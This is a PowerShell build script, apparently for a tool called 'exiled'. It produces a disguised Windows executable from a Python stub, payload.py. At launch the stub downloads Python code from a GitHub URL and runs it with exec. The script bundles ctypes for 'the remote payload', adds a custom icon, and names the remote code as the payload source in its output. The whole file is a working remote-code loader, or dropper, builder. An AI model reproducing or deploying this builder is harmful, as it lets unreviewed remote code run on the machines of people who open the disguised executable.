[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"

$AppName  = "exiled"
$RemoteUrl = $Url
$IconSrc   = $Icon
$OutName   = $Out
$UseIcon   = -not $NoIcon

function Write-Msg {
    param([string]$Level, [string]$Message)
    switch ($Level) {
        "error"   { Write-Host $Message -ForegroundColor Red }
        "warning" { Write-Host $Message -ForegroundColor DarkYellow }
        default   { Write-Host $Message }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }

$PythonExe = $null
foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) { $PythonExe = $cmd.Source; break }
}
if (-not $PythonExe) {
    Write-Msg error "Error: python not found on PATH. Install Python 3.8+ first."
    exit 1
}

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Write-Msg error "Error: neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$IconRaw  = Join-Path $Work "icon.raw"
$IconIco  = Join-Path $Work "icon.ico"
$DistDir  = Join-Path $Here "dist"

Write-Msg info ""
Write-Msg info "Building $AppName for windows-$Arch"
Write-Msg info "Output dir: $Here"

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$stubBody = @"
import urllib.request
exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($IconSrc -match '^https?://') {
        Write-Msg info "Fetching icon..."
        try {
            if ($UseCurl) {
                & curl.exe -fsSL -A "Mozilla/5.0" $IconSrc -o $IconRaw
            } else {
                Invoke-WebRequest -Uri $IconSrc -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
            }
        } catch {
            Write-Msg warning "Failed to fetch icon, skipping icon integration."
            $UseIcon = $false
        }
    } else {
        if (-not (Test-Path -LiteralPath $IconSrc)) {
            Write-Msg warning "Icon file not found at $IconSrc, skipping."
            $UseIcon = $false
        } else {
            Copy-Item -LiteralPath $IconSrc -Destination $IconRaw -Force
        }
    }
}

Write-Msg info "Installing build deps..."
& $PythonExe -m pip install --quiet --upgrade pyinstaller pillow
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "pip install failed."
    exit 1
}

if ($UseIcon) {
    Write-Msg info "Converting icon to .ico..."
    $conv = @"
from PIL import Image
try:
    img = Image.open(r'$IconRaw')
    if img.mode != 'RGBA':
        img = img.convert('RGBA')
    img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
except Exception as e:
    print(f"Icon conversion failed: {e}")
    exit(1)
"@
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    & $PythonExe $convTmp
    if ($LASTEXITCODE -ne 0) {
        Write-Msg warning "Icon conversion failed, skipping icon integration."
        $UseIcon = $false
    }
}

Write-Msg info "Freezing..."

# --hidden-import ctypes ensures PyInstaller bundles the ctypes module so the remote payload can use it
$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "tkinter",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
if ($UseIcon -and (Test-Path $IconIco)) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

& $PythonExe @pyiArgs
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

$ExePath = Join-Path $DistDir "$OutName.exe"

Write-Host ""
Write-Host " _____          _   _              _ " -ForegroundColor DarkYellow
Write-Host "| ____| __  __ (_) | |   ___    __| |" -ForegroundColor DarkYellow
Write-Host "|  _|   \ \/ / | | | |  / _ \  / _`` |" -ForegroundColor DarkYellow
Write-Host "| |___   >  <  | | | | |  __/ | (_| |" -ForegroundColor DarkYellow
Write-Host "|_____| /_/\_\ |_| |_|  \___|  \__,_|" -ForegroundColor DarkYellow
Write-Host ""
Write-Host "Built: $ExePath"
Write-Host "Payload source: $RemoteUrl"
Write-Host ""
Write-Host "Run it:"
Write-Host "  & `"$ExePath`""
Write-Host ""
